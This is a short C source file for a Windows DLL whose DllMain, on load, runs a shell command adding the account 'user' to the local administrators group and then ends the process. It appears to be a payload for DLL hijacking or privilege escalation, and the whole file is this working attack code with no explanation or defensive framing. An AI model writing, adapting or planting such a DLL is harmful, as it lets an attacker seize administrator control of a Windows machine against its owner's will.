#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved ){
	if(dwReason == DLL_PROCESS_ATTACH){
		system("cmd.exe /k net localgroup administrators user  /add");
		ExitProcess(0);
	}
	return TRUE;
	
}
